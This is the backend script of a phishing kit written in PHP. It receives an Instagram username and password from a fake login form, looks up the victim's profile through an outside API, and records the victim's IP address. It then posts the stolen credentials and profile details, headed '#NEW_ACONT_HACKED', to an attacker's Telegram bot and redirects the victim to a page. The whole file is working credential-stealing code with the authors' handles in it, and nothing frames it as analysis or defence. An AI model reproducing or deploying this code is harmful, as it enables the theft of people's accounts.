<?php 
if ( 'POST' != $_SERVER['REQUEST_METHOD'] ) {
$protocol = $_SERVER['SERVER_PROTOCOL'];
if ( ! in_array( $protocol, array( 'HTTP/1.1', 'HTTP/2', 'HTTP/2.0' ) ) ) {
$protocol = 'HTTP/1.0';
}

header( 'Allow: POST' );
header( "$protocol 405 Method Not Allowed" );
header( 'Content-Type: text/plain' );
exit;
}


$nam = $_POST["username"];
$pas = $_POST["PASSWORD"];
include "time.php";
$apieliyainstaprof = file_get_contents("http://api.eliyateam.ir/instaprof.php?user=$nam");
$getchat = json_decode($apieliyainstaprof, true);
 $type = $getchat["type"]; 
$image = $getchat["image"];
 $bio = $getchat["bio"];
$name = $getchat["name"];
$url = $getchat["url"];
$following = $getchat["following"];
$followers = $getchat["followers"];
$posts = $getchat["posts"];

$ip = $_SERVER["REMOTE_ADDR"];
$ORDER = (basename($_GET["e"]));
include"../User/$ORDER.php";
$Text="
#NEW_ACONT_HACKED
________________________
🆔Namepage: <code>$nam</code>
🔐Pasword: <code>$pas</code>
_________________________
📌Biogerafi
_________________________
$bio
_________________________
    CODED BY Panda_Phish
_________________________
🔎Linkbio:$url
_________________________
✳️folowe&folwes&posts
_________________________
⬆️foloweres:$followers
⬇️Folowing:$following
☪️Posts:$posts
_________________________
📷image prof
_________________________
$image
_________________________
📍Type:$type
_________________________
🌐IP: <code>$ip</code>
_________________________
⏰time : $saat
📝 date :$tarikh
✳️today $roz
________-XKILER-_________
👑CODED BY @SunPhish
🆔 @anabel_phishing
🆔 @Panda_Phish
_________________________


";


file_get_contents("https://api.telegram.org/bot$TOKEN/sendMessage?parse_mode=HTML&chat_id=$ID&text=".urlencode($Text));

header("Location: index.php");

?>